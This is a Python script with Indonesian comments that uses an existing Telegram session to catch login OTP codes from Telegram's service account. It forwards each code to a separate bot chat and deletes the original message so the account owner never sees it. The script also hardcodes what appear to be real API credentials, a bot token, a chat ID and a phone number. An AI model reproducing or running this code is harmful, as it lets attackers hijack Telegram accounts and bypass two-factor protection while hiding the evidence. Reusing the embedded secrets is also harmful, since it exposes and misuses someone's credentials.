import os
import re
import asyncio
import requests
from telethon import TelegramClient, events

# Ganti ini dengan milikmu
api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'

# Token bot Telegram dan chat_id kamu
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
CHAT_ID = '7763955214'

# Nomor yang ingin login / dipantau (sertakan kode negara)
phone_number = '+628970621750'  # <--- ganti ini

# Folder penyimpanan session
SESSION_FOLDER = '.'
os.makedirs(SESSION_FOLDER, exist_ok=True)

# Regex OTP dari Telegram resmi
otp_pattern = re.compile(r'\b\d{5,6}\b')

async def monitor_session(phone_number):
    session_name = os.path.join(SESSION_FOLDER, phone_number)
    client = TelegramClient(session_name, api_id, api_hash)

    # Start client (akan meminta OTP jika belum login)
    await client.start(phone_number)
    print(f"[✓] Memantau session: {phone_number}")

    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        msg = event.message.message
        otp_match = otp_pattern.search(msg)

        if otp_match:
            otp_code = otp_match.group()
            print(f"[OTP] {phone_number} menerima OTP: {otp_code}")

            # Kirim ke bot
            send_to_bot(f"📬 OTP dari {phone_number}: `{otp_code}`")

            try:
                await event.delete()
                print(f"[✓] Pesan OTP dari 777000 dihapus.")
            except:
                print("[!] Gagal menghapus pesan OTP.")

    await client.run_until_disconnected()

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[!] Gagal kirim ke bot: {e}")

async def main():
    await monitor_session(phone_number)

if __name__ == '__main__':
    asyncio.run(main())
